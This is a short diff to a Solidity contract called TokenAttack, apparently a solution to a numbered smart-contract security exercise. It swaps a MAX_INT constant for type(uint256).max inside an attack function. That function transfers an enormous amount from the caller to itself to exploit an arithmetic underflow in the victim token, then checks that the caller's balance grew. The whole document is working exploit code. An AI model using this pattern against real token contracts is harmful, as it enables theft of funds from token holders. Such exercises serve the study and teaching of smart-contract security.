@@ -6,7 +6,6 @@ import "./interfaces/5-IToken.sol";
 
 contract TokenAttack {
     IToken public immutable victimToken;
-    uint256 internal constant MAX_INT = 2**256 - 1;
 
     constructor(IToken victimToken_) {
         victimToken = victimToken_;
@@ -15,7 +14,7 @@ contract TokenAttack {
     function attack() external {
         uint256 balance = victimToken.balanceOf(msg.sender);
 
-        victimToken.transfer(msg.sender, MAX_INT - balance - 1);
+        victimToken.transfer(msg.sender, type(uint256).max - balance - 1);
 
         require(
             balance < victimToken.balanceOf(msg.sender),
